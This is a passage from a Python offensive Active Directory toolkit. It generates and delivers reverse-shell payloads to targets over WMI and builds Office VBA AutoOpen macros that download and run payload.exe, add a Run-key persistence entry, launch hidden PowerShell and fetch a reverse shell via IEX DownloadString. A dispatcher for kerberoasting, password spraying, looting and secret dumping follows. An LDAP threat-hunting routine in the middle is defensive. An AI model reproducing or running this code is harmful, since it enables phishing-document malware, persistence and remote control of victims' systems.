            errors.append("revshell module not found — check tools/network/revshell/"); return
        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
        if not gen.get('success'):
            errors.append(f"payload gen failed: {gen.get('error')}"); return
        payload_cmd = list(gen['payloads'].values())[0]
        data['shell'] = {'lhost': lhost, 'lport': lport, 'payload_type': ptype,
                         'payload': payload_cmd, 'listener': f"nc -lvnp {lport}"}
        if auth.has_creds:
            rex = RemoteExec(target, auth, timeout=30)
            log(f"→ Delivering {ptype} payload to {target}…")
            threading.Thread(target=lambda: rex.run_command(payload_cmd), daemon=True).start()
            data['shell']['delivery'] = f'auto ({ptype} via wmiexec/WMI)'
        else:
            data['shell']['delivery'] = 'manual — creds required for auto-delivery'
            log(f"→ Copy payload manually: {payload_cmd[:100]}")
        log(f"→ Starting reverse shell handler on {lhost}:{lport}…")
        if serve:
            rs.op_serve([lport], lhost=lhost)
        else:
            r = rs.op_listen([lport], duration=duration, lhost=lhost)
            data['shell']['sessions']       = r.get('sessions', [])
            data['shell']['sessions_count'] = r.get('sessions_count', 0)

    def do_office_macros():
        log("→ office_macros")
        macro_type  = params.get('macro_type', 'all').lower()
        payload_url = params.get('payload_url', 'http://YOUR-SERVER/payload.exe')
        lhost       = params.get('lhost') or _local_ip()
        lport       = int(params.get('lport', 4444))
        rev_url     = params.get('rev_url', f'http://{lhost}:{lport}/reverse.ps1')
        reg_path    = params.get('reg_path', r'C:\Path\to\macro.vbs')
        ps_command  = params.get('ps_command', 'Get-Process | Out-File -FilePath C:\\Temp\\processes.txt')

        macros = {
            'download_exec': f"""Sub AutoOpen()
    Dim objXMLHTTP As Object, objADOStream As Object, strFilePath As String
    strFilePath = Environ("TEMP") & "\\payload.exe"
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")
    objXMLHTTP.Open "GET", "{payload_url}", False
    objXMLHTTP.Send
    If objXMLHTTP.Status = 200 Then
        objADOStream.Open : objADOStream.Type = 1
        objADOStream.Write objXMLHTTP.responseBody
        objADOStream.Position = 0
        objADOStream.SaveToFile strFilePath, 2
        objADOStream.Close
        CreateObject("WScript.Shell").Run strFilePath
    End If
End Sub""",
            'hidden_cmd_exec': f"""Sub AutoOpen()
    Dim command As String
    command = "cmd.exe /c bitsadmin /transfer dl {payload_url} C:\\Temp\\payload.exe && start C:\\Temp\\payload.exe"
    CreateObject("WScript.Shell").Run command, 0, False
End Sub""",
            'persistence': (
                f'Sub AutoOpen()\n'
                f'    CreateObject("WScript.Shell").RegWrite _\n'
                f'        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecVMacro", _\n'
                f'        "wscript.exe " & Chr(34) & "{reg_path}" & Chr(34)\n'
                f'End Sub'
            ),
            'pwsh_cmd': (
                f'Sub AutoOpen()\n'
                f'    Dim command As String\n'
                f'    command = "powershell.exe -WindowStyle Hidden -NoP -NonI -ExecutionPolicy Bypass -Command "'
                f' & Chr(34) & "{ps_command}" & Chr(34)\n'
                f'    CreateObject("WScript.Shell").Run command, 0, False\n'
                f'End Sub'
            ),
            'reverse_shell': (
                f'Sub AutoOpen()\n'
                f'    CreateObject("WScript.Shell").Run _\n'
                f'        "cmd.exe /c powershell -NoP -W Hidden -C " & Chr(34) & '
                f'"IEX(New-Object Net.WebClient).DownloadString(\'{rev_url}\')" & Chr(34)\n'
                f'End Sub'
            ),
        }

        selected = macros if macro_type == 'all' else {macro_type: macros[macro_type]} if macro_type in macros else {}
        if not selected:
            errors.append(f"Unknown macro_type '{macro_type}'. Options: {list(macros.keys())} + all"); return

        data['office_macros'] = {
            'macros': selected,
            'count': len(selected),
            'usage': 'Paste into Office VBA editor (Alt+F11). Macro fires on document open.',
            'note': 'Update payload_url / rev_url / reg_path / ps_command params to customise.',
        }
        log(f"→ Generated {len(selected)} Office VBA macro(s): {list(selected.keys())}")

    def do_hunt():
        """
        LDAP-based threat hunting — detect malware-associated AD anomalies.
        Derived from theZoo analysis: OperationDianxun LDAP enum, NotPetya computer
        account proliferation, EternalRocks service account patterns.
        Requires LDAP read access (anonymous or authenticated).
        """
        log("→ hunt")
        if not CAPS.get('ldap3'):
            errors.append("hunt requires ldap3: pip install ldap3"); return

        try:
            import ldap3
            s = ldap3.Server(target, get_info=ldap3.ALL, connect_timeout=timeout)
            if auth.has_creds:
                c = ldap3.Connection(s, user=f'{auth.domain}\\{auth.username}',
                                     password=auth.password, auto_bind=True)
            else:
                c = ldap3.Connection(s, auto_bind=True)
        except Exception as e:
            errors.append(f"hunt: LDAP connect failed: {e}"); return

        base_dn = auth.base_dn or data.get('discover', {}).get('base_dn', '')
        if not base_dn:
            errors.append("hunt: base_dn required — run discover first"); return

        findings = []

        # ── 1. Recently created computer accounts (NotPetya lateral move) ─
        try:
            # computers created in last 72h (EternalBlue propagation artifact)
            import datetime
            cutoff = datetime.datetime.utcnow() - datetime.timedelta(hours=72)
            # AD stores time as 100-nanosecond intervals since 1601-01-01
            ad_cutoff = int((cutoff - datetime.datetime(1601, 1, 1)).total_seconds() * 10_000_000)
            c.search(base_dn,
                f'(&(objectClass=computer)(whenCreated>={cutoff.strftime("%Y%m%d%H%M%S.0Z")}))',
                attributes=['cn', 'whenCreated', 'dNSHostName', 'operatingSystem'])
            for e in c.entries:
                findings.append({
                    'category': 'new_computer',
                    'severity': 'HIGH',
                    'detail': f'New computer account: {e.cn} ({getattr(e,"dNSHostName","")}) '
                              f'created {getattr(e,"whenCreated","")}',
                    'technique': 'T1078.002 - Valid Accounts: Domain Accounts (NotPetya propagation pattern)',
                })
        except Exception as e:
            log(f"  hunt/new_computers: {e}")

        # ── 2. Accounts with unusual SPNs (Kerberoasting prep / malware service accounts) ─
        try:
            c.search(base_dn,
                '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))'
                '(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['cn', 'servicePrincipalName', 'whenCreated',
                            'pwdLastSet', 'adminCount'])
            for e in c.entries:
                spns = list(getattr(e, 'servicePrincipalName', []) or [])
                sus = [s for s in spns if not any(
                    s.lower().startswith(p) for p in
                    ('host/', 'http/', 'ldap/', 'gc/', 'dns/', 'msomsdpsvc/')
                )]
                if sus:
                    findings.append({
                        'category': 'unusual_spn',
                        'severity': 'HIGH',
                        'detail':   f'{e.cn}: unusual SPNs {sus[:3]} — potential Kerberoasting target or malware service account',
                        'technique': 'T1558.003 - Steal/Forge Kerberos Tickets (OperationDianxun SPN pattern)',
                    })
        except Exception as e:
            log(f"  hunt/spn: {e}")

        # ── 3. AdminSDHolder protected accounts modified recently ─────────
        try:
            c.search(base_dn,
                '(&(objectClass=user)(adminCount=1)(!(objectClass=computer)))',
                attributes=['cn', 'whenChanged', 'memberOf', 'userAccountControl'])
            admin_protected = []
            for e in c.entries:
                admin_protected.append({
                    'account': str(e.cn),
                    'changed': str(getattr(e, 'whenChanged', '')),
                    'groups':  [str(g).split(',')[0].replace('CN=','')
                                for g in list(getattr(e,'memberOf',[]) or [])[:5]],
                })
            if admin_protected:
                findings.append({
                    'category':  'adminsdholder',
                    'severity':  'HIGH',
                    'detail':    f'AdminSDHolder-protected accounts ({len(admin_protected)}): '
                                 f'{[a["account"] for a in admin_protected[:5]]}',
                    'accounts':  admin_protected[:20],
                    'technique': 'T1003 - AdminSDHolder persistence (common post-compromise)',
                })
        except Exception as e:
            log(f"  hunt/adminsdholder: {e}")

        # ── 4. User accounts with password not required or never expires ──
        try:
            # UAC flags: 0x0002=disabled, 0x0020=no-passwd-required, 0x10000=no-expiry
            c.search(base_dn,
                '(&(objectClass=user)(!(objectClass=computer))'
                '(|(userAccountControl:1.2.840.113556.1.4.803:=32)'
                '(userAccountControl:1.2.840.113556.1.4.803:=65536)))',
                attributes=['cn', 'userAccountControl', 'lastLogon'])
            weak_accounts = [str(e.cn) for e in c.entries]
            if weak_accounts:
                findings.append({
                    'category': 'weak_account_policy',
                    'severity': 'MEDIUM',
                    'detail':   f'{len(weak_accounts)} accounts with no-password-required or password-never-expires: {weak_accounts[:10]}',
                    'technique': 'T1078 - Valid Accounts (spray / pass-the-hash target)',
                })
        except Exception as e:
            log(f"  hunt/weak_accounts: {e}")

        # ── 5. Domain controllers not in "Domain Controllers" OU ──────────
        try:
            c.search(base_dn,
                '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
                attributes=['cn', 'distinguishedName', 'dNSHostName'])
            for e in c.entries:
                dn = str(getattr(e, 'distinguishedName', ''))
                if 'Domain Controllers' not in dn:
                    findings.append({
                        'category': 'rogue_dc',
                        'severity': 'CRITICAL',
                        'detail':   f'Domain Controller outside "Domain Controllers" OU: {e.cn} ({dn}) — possible DCSync target or rogue DC',
                        'technique': 'T1207 - Rogue Domain Controller (DCShadow)',
                    })
        except Exception as e:
            log(f"  hunt/rogue_dc: {e}")

        # ── 6. Stale privileged accounts (not logged in > 90 days, still DA) ─
        try:
            import datetime
            cutoff90 = datetime.datetime.utcnow() - datetime.timedelta(days=90)
            ad_cutoff90 = int((cutoff90 - datetime.datetime(1601,1,1)).total_seconds() * 10_000_000)
            c.search(base_dn,
                f'(&(objectClass=user)(adminCount=1)'
                f'(lastLogon<={ad_cutoff90})'
                f'(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['cn', 'lastLogon', 'memberOf'])
            stale = [str(e.cn) for e in c.entries]
            if stale:
                findings.append({
                    'category': 'stale_privileged',
                    'severity': 'HIGH',
                    'detail':   f'{len(stale)} privileged accounts inactive >90 days: {stale[:5]}',
                    'technique': 'T1078 - Valid Accounts (stale DA — pass-the-hash target with no recent password change)',
                })
        except Exception as e:
            log(f"  hunt/stale_privileged: {e}")

        data['hunt'] = {
            'findings':  findings,
            'count':     len(findings),
            'critical':  len([f for f in findings if f.get('severity') == 'CRITICAL']),
            'high':      len([f for f in findings if f.get('severity') == 'HIGH']),
            'note':      'Techniques derived from theZoo malware analysis: NotPetya, OperationDianxun, EternalRocks',
        }
        log(f"→ hunt: {len(findings)} finding(s) ({data['hunt']['critical']} critical)")

    handlers = {
        'discover':      lambda: None,   # already done above
        'users':         do_users,
        'groups':        do_groups,
        'shares':        do_shares,
        'passpol':       do_passpol,
        'kerberoast':    do_kerberoast,
        'asreproast':    do_asreproast,
        'spray':         do_spray,
        'vulncheck':     do_vulncheck,
        'bloodhound':    do_bloodhound,
        'loot':          do_loot,
        'secrets':       do_secrets,
        'exec':          do_exec,
        'privesc_check': do_privesc_check,
        'hunt':          do_hunt,
        'shell':         do_shell,
        'office_macros': do_office_macros,
    }

    if operation == 'auto':
        # Safe full pipeline
        for op in ['vulncheck', 'users', 'groups', 'shares', 'passpol']:
            try:
                handlers[op]()
            except Exception as e:
                errors.append(f"{op}: {e}")
        if auth.has_creds:
            for op in ['kerberoast', 'asreproast', 'bloodhound', 'loot',
                       'privesc_check', 'hunt']:
                try:
                    handlers[op]()
                except Exception as e:
                    errors.append(f"{op}: {e}")
        else:
            # asreproast doesn't need creds if we have userlist
            if params.get('userlist'):
                try:
                    do_asreproast()
                except Exception as e:
                    errors.append(f"asreproast: {e}")
    elif operation in handlers:
        try:
            handlers[operation]()
        except Exception as e:
            import traceback
            errors.append(f"{operation}: {e}")
            errors.append(traceback.format_exc()[:1000])
    else:
        errors.append(f"unknown operation: {operation}")

    emit(len(errors) == 0 or bool(data), data, errors)


if __name__ == '__main__':
    main()
